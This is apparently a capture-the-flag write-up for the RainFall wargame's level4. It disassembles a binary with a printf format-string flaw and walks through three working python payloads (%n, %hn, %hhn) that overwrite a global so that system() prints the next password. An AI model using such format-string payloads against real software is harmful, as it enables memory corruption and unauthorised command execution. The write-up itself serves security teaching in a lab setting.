Disassembly of the program using gdb:

```assembly
Dump of assembler code for function p:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x8(%ebp),%eax
   0x0804844d <+9>:	mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret

Dump of assembler code for function n:
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret

Dump of assembler code for function main:
   0x080484a7 <+0>:	push   %ebp
   0x080484a8 <+1>:	mov    %esp,%ebp
   0x080484aa <+3>:	and    $0xfffffff0,%esp
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret
```

Decompiled version from BinaryNinja:

```C
int32_t p(char* arg1)
{
    return printf(arg1);
}

uint32_t n()
{
    void var_20c;
    fgets(&var_20c, 0x200, stdin);
    p(&var_20c);
    uint32_t eax = m;
    if (eax == 0x1025544)
    {
        eax = system("/bin/cat /home/user/level5/.pass");
    }
    return eax;
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    return n();
}
```

This challenge is similar to the previous one in that the use of the printf function seems vulnerable to a format string attack, with the exception that we need to write a 4-byte value to EAX. The use of the %hn formatter (to write 2 bytes) or %hhn formatter (to write 1 byte) seems to be the solution.

From this, we can deduce that we control the input starting from the 12th formatter:

```shell
level4@RainFall:~$ ./level4 
AAAABBBB %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
AAAABBBB b7ff26b0 bffff794 b7fd0ff4 00000000 00000000 bffff758 0804848d bffff550 00000200 b7fd1ac0 b7ff37d0 41414141 42424242 38302520 30252078
```

We can also see from these instructions that we should rewrite the bytes starting from the address `0x8049810`, as from 0x0804848d, the value at address 0x8049810 is loaded into the EAX register:

```assembly
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
```

OK, the same technique works with just a `%n` formatter. I wrote the required value (-4) to the address all at once:

```shell
python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"'| ./level4
```

We could have also written 2 bytes at a time, for example:

```shell
python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%21820d%12$hn" + "%43966d%13$hn"' | ./level4
```

Here, we use the `%hn` formatter, first writing the addresses to write to, while incrementing by addr+2, and then writing the values 2 bytes at a time.

In this solution, you first write the lowest 2 bytes (little endian) to the first address, subtracting 8 for the size of the two addresses. Then, for the higher 2 bytes, subtract the value of the lower bytes. This results in:

- 0x1025544 = 258 21828
- 21828 - 8 = 21820, which gives `%21820d%12$hn`
- 258 - 21828 = -21570 = 43966 as an unsigned 16-bit integer, which gives `%43966d%13$hn`

That's exactly the same logic when writing byte by byte:

```shell
python -c 'print "\x10\x98\x04\x08" + "\x11\x98\x04\x08" + "\x12\x98\x04\x08" + "\x13\x98\x04\x08" + "%52d%12$hhn" + "%17d%13$hhn" + "%173d%14$hhn" + "%255d%15$hhn"' | ./level4
```

You use the `%hhn` formatter, convert the values to decimal, and subtract the value of the previous byte while considering an unsigned result on 8 bits. This applies to all except the first byte, where you subtract the sum of the number of read addresses (4*4). Finally, you apply these values while incrementing each time by addr+1:

0x1025544 = 1 2 85 68 in decimal = 68 85 2 1 in little endian

68 - (4*4) = 52 = `%52d%12$hhn` at address `0x8049810`

85 - 68 = 17 = `%17d%13$hhn` at address `0x8049811`

2 - 85 = 173 = `%173d%14$hhn` at address `0x8049812`

1 - 2 = 255 = `%255d%15$hhn` at address `0x8049813`

Then, you simply retrieve the flag that appeared directly on stdout.
